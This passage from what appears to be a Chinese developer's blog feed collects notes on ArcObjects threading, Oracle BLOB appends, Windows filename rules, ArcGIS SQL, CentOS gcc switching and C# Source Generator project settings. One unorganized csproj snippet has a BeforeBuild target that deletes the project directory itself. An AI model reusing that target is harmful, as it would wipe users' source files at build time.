UI”的方式，调用另一个 STA 线程的上控件，来实现特定的任务（该任务使用了 ArcObjects）[任务在被调用方所在的线程上执行]。这样就避免了跨 apartment 调用。</p><p>更深一点的本质是：在多个STA线程之间，实现对共享资源 m_activeView 的同步。</p><p>要点：</p><ul><li>由被调用方创建辅助类实例；</li><li>调用方调用 辅助类实例的 InvokeMethod 方法。</li></ul><p>示例中，</p><ul><li>运行 OnClick() 的线程，有 m_hookHelper.ActiveView 对象，因为 m_invokeHelper 在这个方法内创建；</li><li>运行 OnTimerElapsed() 的线程，调用 辅助类实例 m_invokeHelper 的 InvokeMethod 方法，该线程由计时器 Elapsed 事件的处理程序产生。 运行 OnTimerElapsed() 的线程，由计时器创建。计时器有一个计时线程，为了不阻塞计时线程，必然需要另外的线程来执行 Elapsed 事件的回调方法 OnTimerElapsed，而不是在每次符合触发条件时一直在计时线程上执行回调方法。每次新开线程执行回调方法时，都通过控件的 Invoke 方法，让创建控件的线程来执行控件的更新。这样做，间接地避免了跨 apartment 调用 m_hookHelper.ActiveView 对象。<br>带地理处理（geoprocessing）的多线程<br>要在异步或多线程应用程序中使用地理处理，请使用以下选项之一：</li></ul><p>在 ArcGIS Server 9.2 及更高版本中，使用 geoprocessing 服务。 这使得桌面应用程序能够以异步执行模式处理 geoprocessing，并相互异步运行多个 geoprocessing 工具。 How to work with geoprocessing services 中描述了【执行服务器工具和听取反馈的】机制。<br>在 ArcGIS 10 中，使用 Geoprocessor.ExecuteAsync 方法。您可以对 ArcGIS 应用程序异步执行工具。 这意味着当工具在后台进程中执行时，ArcGIS 桌面应用程序或控件（例如，MapControl、PageLayoutControl、GlobeControl 或 SceneControl）保持对用户响应。 换句话说，可以在工具执行输入数据集时查看和查询数据。 这在 Running a geoprocessing tool using background geoprocessing 中有更全面的描述。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Oracle对blob字段内容进行追加</title>
      <link href="//archives/1709629513198"/>
      <url>//archives/1709629513198</url>
      
        <content type="html"><![CDATA[<h2 id="Oracle对blob字段内容进行追加"><a href="#Oracle对blob字段内容进行追加" class="headerlink" title="Oracle对blob字段内容进行追加"></a>Oracle对blob字段内容进行追加</h2><p>在blob字段的开头和结尾分别插入文本。</p><blockquote><p><em>感谢chatgpt的支持</em></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  v_start_text  VARCHAR2(<span class="number">32</span>) :<span class="operator">=</span> <span class="string">&#x27;&#123;&quot;start&quot;:&#x27;</span>; <span class="comment">-- 开头要插入的文本</span></span><br><span class="line">  v_end_text    VARCHAR2(<span class="number">32</span>) :<span class="operator">=</span> <span class="string">&#x27;&#125;&#x27;</span>;       <span class="comment">-- 结尾要插入的文本</span></span><br><span class="line">  v_blob        <span class="type">BLOB</span>;                        <span class="comment">-- 原始的BLOB数据</span></span><br><span class="line">  v_new_blob    <span class="type">BLOB</span>;                        <span class="comment">-- 新的BLOB数据</span></span><br><span class="line">  v_dest_offset <span class="type">INTEGER</span> :<span class="operator">=</span> <span class="number">1</span>;                <span class="comment">-- 目标偏移量</span></span><br><span class="line">  v_buffer_size <span class="type">INTEGER</span> :<span class="operator">=</span> <span class="number">32767</span>;            <span class="comment">-- 缓冲区大小</span></span><br><span class="line">  <span class="keyword">CURSOR</span> c_blobs <span class="keyword">IS</span></span><br><span class="line">    <span class="keyword">SELECT</span> <span class="type">Blob</span>字段名</span><br><span class="line">    <span class="keyword">FROM</span> 表名</span><br><span class="line">    <span class="keyword">WHERE</span> 过滤条件 <span class="keyword">FOR</span> UPDATE;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">FOR</span> rec <span class="keyword">IN</span> c_blobs LOOP</span><br><span class="line">    <span class="comment">-- 选择原有的BLOB数据</span></span><br><span class="line">    v_blob :<span class="operator">=</span> rec.Blob字段名;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 创建新的BLOB</span></span><br><span class="line">    DBMS_LOB.CREATETEMPORARY(v_new_blob, <span class="literal">TRUE</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 将开头的文本转换为BLOB并写入到新的BLOB中</span></span><br><span class="line">    DBMS_LOB.WRITE(v_new_blob, LENGTH(v_start_text), v_dest_offset, UTL_RAW.CAST_TO_RAW(v_start_text));</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 更新目标偏移量</span></span><br><span class="line">    v_dest_offset :<span class="operator">=</span> DBMS_LOB.GETLENGTH(v_new_blob) <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 如果原始BLOB不为空，追加到新BLOB中</span></span><br><span class="line">    IF v_blob <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">THEN</span></span><br><span class="line">      DBMS_LOB.COPY(v_new_blob, v_blob, DBMS_LOB.GETLENGTH(v_blob), v_dest_offset);</span><br><span class="line">    <span class="keyword">END</span> IF;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 更新目标偏移量，准备在BLOB末尾添加内容</span></span><br><span class="line">    v_dest_offset :<span class="operator">=</span> DBMS_LOB.GETLENGTH(v_new_blob) <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 将结尾的文本转换为BLOB并追加到新的BLOB中</span></span><br><span class="line">    DBMS_LOB.WRITEAPPEND(v_new_blob, LENGTH(v_end_text), UTL_RAW.CAST_TO_RAW(v_end_text));</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 更新原始BLOB字段</span></span><br><span class="line">    UPDATE 表名</span><br><span class="line">    <span class="keyword">SET</span> <span class="type">Blob</span>字段名 <span class="operator">=</span> v_new_blob</span><br><span class="line">    <span class="keyword">WHERE</span> <span class="keyword">CURRENT</span> <span class="keyword">OF</span> c_blobs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 释放创建的临时BLOB资源</span></span><br><span class="line">    DBMS_LOB.FREETEMPORARY(v_new_blob);</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 清除目标偏移量以备下一次循环使用</span></span><br><span class="line">    v_dest_offset :<span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">END</span> LOOP;</span><br><span class="line"></span><br><span class="line">  <span class="comment">-- 提交事务</span></span><br><span class="line">  <span class="keyword">COMMIT</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>windows目录、文件名称限制</title>
      <link href="//archives/1705890990082"/>
      <url>//archives/1705890990082</url>
      
        <content type="html"><![CDATA[<h2 id="windows目录、文件名称限制"><a href="#windows目录、文件名称限制" class="headerlink" title="windows目录、文件名称限制"></a>windows目录、文件名称限制</h2><blockquote><p><code>AnswerByGPT</code></p></blockquote><p>在Windows操作系统中，文件和目录的名称是有一定限制的。以下是一些主要限制：</p><ol><li><p>字符限制：文件和目录名称不能包含以下字符：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; <span class="comment">(小于)</span></span><br><span class="line">&gt; <span class="comment">(大于)</span></span><br><span class="line">: <span class="comment">(冒号)</span></span><br><span class="line"><span class="string">&quot; (双引号)</span></span><br><span class="line"><span class="string">/ (正斜杠)</span></span><br><span class="line"><span class="string">\ (反斜杠)</span></span><br><span class="line"><span class="string">| (竖线或管道符)</span></span><br><span class="line"><span class="string">? (问号)</span></span><br><span class="line"><span class="string">* (星号)</span></span><br></pre></td></tr></table></figure></li><li><p>保留名称：某些名称在Windows中是保留的，无论它们的扩展名是什么。这些包括：<code>CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, 和 LPT9. 例如，你不能创建名为&quot;CON.txt&quot;的文件。</code></p></li><li><p>总路径长度：在Windows中，最大路径长度（MAX_PATH）通常限制为260个字符，这包括文件名、扩展名以及它们的完整路径。从Windows 10版本1607开始，可以通过修改注册表或组策略来支持长路径（超过260个字符），不过这需要应用程序也明确地支持。</p></li><li><p>文件名和目录名的长度：除了完整路径的限制外，每个组成部分（目录名或文件名）的长度也有限制。通常，这个限制为255个字符。</p></li><li><p>结尾字符：文件和目录的名称不能以空格或句点字符结尾。</p></li><li><p>大小写：Windows文件系统（如NTFS和FAT32）是大小写不敏感的，这意味着它不区分文件或目录名称中的大小写字母。但是，它保留了大小写，例如，你可以创建一个名为“Example.txt”的文件，它会显示为你输入的样子，但是“example.txt”和“EXAMPLE.TXT”会被视为同一个文件。</p></li></ol><p>为了确保文件或目录名称的有效性，应用程序通常需要对用户提供的名称进行检查和清理，以便符合上述限制。在编程时，这意味着应该对用户的输入进行验证，必要时对其进行适当的清理或转换，以防止文件系统错误或异常。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ArcEngine GP工具相关</title>
      <link href="//archives/1705480694442"/>
      <url>//archives/1705480694442</url>
      
        <content type="html"><![CDATA[<h2 id="ArcEngine-调用gp工具注意事项"><a href="#ArcEngine-调用gp工具注意事项" class="headerlink" title="ArcEngine 调用gp工具注意事项"></a>ArcEngine 调用gp工具注意事项</h2><ul><li><p>路径有空格需要加 ‘’</p></li><li><p>多个可以用 ; 隔开</p></li></ul><!--## 如何在同一台机器中编译多版本使用的程序--><h2 id="GP工具相关信息"><a href="#GP工具相关信息" class="headerlink" title="GP工具相关信息"></a>GP工具相关信息</h2><p>注册gp工具后，会在指定目录下生成一个压缩包，解压后，里面有个 <code>config.xml</code>，内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ESRI.Configuration</span> <span class="attr">ver</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Categories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Category</span> <span class="attr">CATID</span>=<span class="string">&quot;&#123;FD939A4A-955D-4094-B440-77083E410F41&#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Class</span> <span class="attr">CLSID</span>=<span class="string">&quot;&#123;F1094FDB-984B-31E3-A1BF-D95EB8B6024E&#125;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Category</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Categories</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ESRI.Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，<code>&lt;Category CATID=&quot;&#123;FD939A4A-955D-4094-B440-77083E410F41&#125;&quot;&gt;</code> 表示一个特定的COM类别。CATID是类别标识符，是一个全局唯一标识符（GUID），用于唯一标识COM的一个类别。在注册表中<code>HKEY_CLASSES_ROOT\Component Categories\&#123;FD939A4A-955D-4094-B440-77083E410F41&#125;</code>中可以找到对应项目。</p><p><img src="/upload/Snipaste_2024-01-17_16-41-50.png" alt="Snipaste_2024-01-17_16-41-50.png"></p><p><code>&lt;Class CLSID=&quot;&#123;98E3A58C-4A93-32F7-A13F-E02CF05C2ED1&#125;&quot;/&gt;</code>表示属于上述CATID类别的一个COM类。CLSID是类的唯一标识符（也是一个GUID），代表在这个类别下注册的一个具体的COM组件。该标识符在注册表<code>\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\&#123;98E3A58C-4A93-32F7-A13F-E02CF05C2ED1&#125;</code>中可以找到。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Centos7同步第三方网盘数据（阿里云盘）</title>
      <link href="//archives/1705157612935"/>
      <url>//archives/1705157612935</url>
      
        <content type="html"><![CDATA[<h2 id="windows挂载"><a href="#windows挂载" class="headerlink" title="windows挂载"></a>windows挂载</h2><p>AList + Raidrive</p><h2 id="Centos7-挂载"><a href="#Centos7-挂载" class="headerlink" title="Centos7 挂载"></a>Centos7 挂载</h2><p>AList + RClone</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装alist</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装rclone</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定时任务</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://willxup.top/archives/deploy-alist-and-rclone">rclone和alist挂载网盘到本地</a></p>]]></content>
      
      
      <categories>
          
          <category> 服务器使用指南 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> linux运维centos7 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arcgis删除重复图斑</title>
      <link href="//archives/1705045477378"/>
      <url>//archives/1705045477378</url>
      
        <content type="html"><![CDATA[<p>arcgis 通过过滤条件删除重复数据，仅保留一条 (对于 SDE 或个人地理数据库内的要素类有效）<br>或者直接使用<strong>delete identical</strong>工具。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[FIELD_NAME] <span class="keyword">In</span> (</span><br><span class="line">    <span class="keyword">SELECT</span></span><br><span class="line">        [FIELD_NAME]</span><br><span class="line">    <span class="keyword">FROM</span></span><br><span class="line">        [TABLE_NAME]</span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">        [FIELD_NAME]</span><br><span class="line">    <span class="keyword">HAVING</span></span><br><span class="line">        <span class="built_in">Count</span>(<span class="operator">*</span>) <span class="operator">&gt;</span> <span class="number">1</span>  </span><br><span class="line">)</span><br><span class="line"><span class="keyword">and</span> [OID_FIELD_NAME] <span class="keyword">NOT</span> <span class="keyword">In</span> (</span><br><span class="line">    <span class="keyword">SELECT</span></span><br><span class="line">        <span class="built_in">MIN</span>([OID_FIELD_NAME])</span><br><span class="line">    <span class="keyword">FROM</span></span><br><span class="line">        [TABLE_NAME]</span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">        [FIELD_NAME]</span><br><span class="line">    <span class="keyword">HAVING</span></span><br><span class="line">        <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;</span> <span class="number">1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://support.esri.com/zh-cn/knowledge-base/-000006708">地址</a></p>]]></content>
      
      
      <categories>
          
          <category> gisarcengine二次开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>arcgis server 视图服务调用query接口的问题</title>
      <link href="//archives/1698215383156"/>
      <url>//archives/1698215383156</url>
      
        <content type="html"><![CDATA[<p><img src="/upload/Snipaste_2023-10-25_14-45-07.png" alt="问题"><br>需要选择objectid作为唯一标识字段才可以。<br>1.可以在添加的时候选择</p><p><img src="/upload/ArcGIS_2023-10-25_14-35-18.png" alt="ArcGIS_2023-10-25_14-35-18.png"></p><ol start="2"><li>也可以视图执行注册到地理数据库，这样可以直接把视图当成要素图层添加到arcmap中<br><img src="/upload/ArcGIS_2023-10-25_14-37-03.png" alt="ArcGIS_2023-10-25_14-37-03.png"><br><img src="/upload/ArcGIS_2023-10-25_14-37-44.png" alt="ArcGIS_2023-10-25_14-37-44.png"> </li></ol><p>推荐第二种方式。因为objectid作为唯一标识字段，所以如果是 union 后的表应该就不能用统计功能</p><p>shp限制<a href="https://www.cnblogs.com/bobird/articles/3198270.html">参考</a></p><p><img src="/upload/Snipaste_2024-01-11_16-40-17.png" alt="Snipaste_2024-01-11_16-40-17.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Source Generator 设置</title>
      <link href="//archives/1697796268782"/>
      <url>//archives/1697796268782</url>
      
        <content type="html"><![CDATA[<p>netstandard2.0</p><p>引入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">PackageReference</span> <span class="attr">Include</span>=<span class="string">&quot;Microsoft.CodeAnalysis.CSharp&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;3.11.0&quot;</span> <span class="attr">PrivateAssets</span>=<span class="string">&quot;all&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PackageReference</span> <span class="attr">Include</span>=<span class="string">&quot;Scripty.MsBuild&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;0.7.4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PrivateAssets</span>&gt;</span>all<span class="tag">&lt;/<span class="name">PrivateAssets</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">IncludeAssets</span>&gt;</span>runtime; build; native; contentfiles; analyzers; buildtransitive<span class="tag">&lt;/<span class="name">IncludeAssets</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PackageReference</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span><span class="tag">&lt;<span class="name">CompilerGeneratedFilesOutputPath</span>&gt;</span>$(MSBuildProjectDirectory)\GeneratedFiles<span class="tag">&lt;/<span class="name">CompilerGeneratedFilesOutputPath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">GenerateDocumentationFile</span>&gt;</span>True<span class="tag">&lt;/<span class="name">GenerateDocumentationFile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ItemGroup</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">ProjectReference</span> <span class="attr">Include</span>=<span class="string">&quot;..\SourceGenerate\SourceGenerate.csproj&quot;</span> <span class="attr">OutputItemType</span>=<span class="string">&quot;Analyzer&quot;</span> <span class="attr">ReferenceOutputAssembly</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">EmbeddedResource</span> <span class="attr">Remove</span>=<span class="string">&quot;GeneratedFiles\**&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Compile</span> <span class="attr">Remove</span>=<span class="string">&quot;GeneratedFiles\**&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">None</span> <span class="attr">Remove</span>=<span class="string">&quot;GeneratedFiles\**&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ItemGroup</span>&gt;</span></span><br></pre></td></tr></table></figure><p>未整理</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">EmitCompilerGeneratedFiles</span>&gt;</span>true<span class="tag">&lt;/<span class="name">EmitCompilerGeneratedFiles</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CompilerGeneratedFilesOutputPath</span>&gt;</span>$(MSBuildProjectDirectory)<span class="tag">&lt;/<span class="name">CompilerGeneratedFilesOutputPath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">GenerateDocumentationFile</span>&gt;</span>true<span class="tag">&lt;/<span class="name">GenerateDocumentationFile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IsRemoveCompilerFiles</span>&gt;</span>true<span class="tag">&lt;/<span class="name">IsRemoveCompilerFiles</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ItemGroup</span> <span class="attr">Condition</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Compile</span> <span class="attr">Remove</span>=<span class="string">&quot;CodeAutoGenerate.Contracts\**&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">EmbeddedResource</span> <span class="attr">Remove</span>=<span class="string">&quot;CodeAutoGenerate.Contracts\**&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">None</span> <span class="attr">Remove</span>=<span class="string">&quot;CodeAutoGenerate.Contracts\**&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ProjectReference</span> <span class="attr">Include</span>=<span class="string">&quot;..\CodeAutoGenerate.Contracts\CodeAutoGenerate.Contracts.csproj&quot;</span> <span class="attr">OutputItemType</span>=<span class="string">&quot;Analyzer&quot;</span> <span class="attr">ReferenceOutputAssembly</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Target</span> <span class="attr">Name</span>=<span class="string">&quot;BeforeBuild&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">RemoveDir</span> <span class="attr">Directories</span>=<span class="string">&quot;$(MSBuildProjectDirectory)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Target</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Compile</span> <span class="attr">Remove</span>=<span class="string">&quot;CodeAutoGenerate.Contracts\**&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Target</span> <span class="attr">Name</span>=<span class="string">&quot;AfterAnalyzer&quot;</span> <span class="attr">BeforeTargets</span>=<span class="string">&quot;CoreCompile&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Target</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>centos7 切换gcc版本</title>
      <link href="//archives/1696427782259"/>
      <url>//archives/1696427782259</url>
      
        <content type="html"><![CDATA[<h2 id="centos7-更新内核"><a href="#centos7-更新内核" class="headerlink" title="centos7 更新内核"></a>centos7 更新内核</h2><h2 id="无法识别网卡（更新）"><a href="#无法识别网卡（更新）" class="headerlink" title="无法识别网卡（更新）"></a>无法识别网卡（更新）</h2><h2 id="切换gcc版本"><a href="#切换gcc版本" class="headerlink" title="切换gcc版本"></a>切换gcc版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc gcc-c++</span><br><span class="line">gcc --version</span><br><span class="line">g++ --version</span><br><span class="line">sudo yum install -y http://mirror.centos.org/centos/7/extras/x86_64/Packages/centos-release-scl-rh-2-3.el7.centos.noarch.rpm</span><br><span class="line">sudo yum install -y http://mirror.centos.org/centos/7/extras/x86_64/Packages/centos-release-scl-2-3.el7.centos.noarch.rpm</span><br><span class="line">sudo yum install devtoolset-9-gcc-c++  <span class="string">&#x27;安装指定版本 9 为版本号</span></span><br><span class="line"><span class="string">scl enable devtoolset-9 bash</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/b_ingram/article/details/121569398">CentOS 7环境下安装高版本GCC (gcc/g++ 9.3)</a><br><a href="https://www.cnblogs.com/wztshine/p/16163413.html">centos7安装pyhthon3.9</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>01：工厂模式基础使用</title>
      <link href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/01%EF%BC%9A%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
      <url>/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/01%EF%BC%9A%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><a href="https://design-patterns.readthedocs.io/zh_CN/latest/creational_patterns/creational.html">创建型模式</a>对类的实例化过程进行了抽象，能够将软件模块中对象的创建和对象的使用分离。其隐藏了类的实例的创建细节。包括简单工厂模式、工厂方法模式、抽象工厂模式、建造者模式、原型模式、单例模式。<br>工厂模式并不是一个独立的设计模式，而是三种功能接近的设计模式(简单工厂模式、工厂方法模式、抽象工厂模式)的统称。</p><span id="more"></span><h3 id="工厂模式举例"><a href="#工厂模式举例" class="headerlink" title="工厂模式举例"></a>工厂模式举例</h3><p>创建对象如果需要一系列的初始化操作，一般来说可以写在构造函数里，不过这样的话会导致构造函数的代码变得太长，降低程序的可读性。所以，我们可以增加一个特殊的类，即工厂类，用来负责对象的创建工作。</p><p>假设我们需要一个被广泛引用的“口罩类”，其初始化的代码也比较复杂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mask</span></span>&#123;</span><br><span class="line">  <span class="comment">// 构造函数</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Mask</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 100行初始化代码k</span></span><br><span class="line">  &#125;</span><br><span 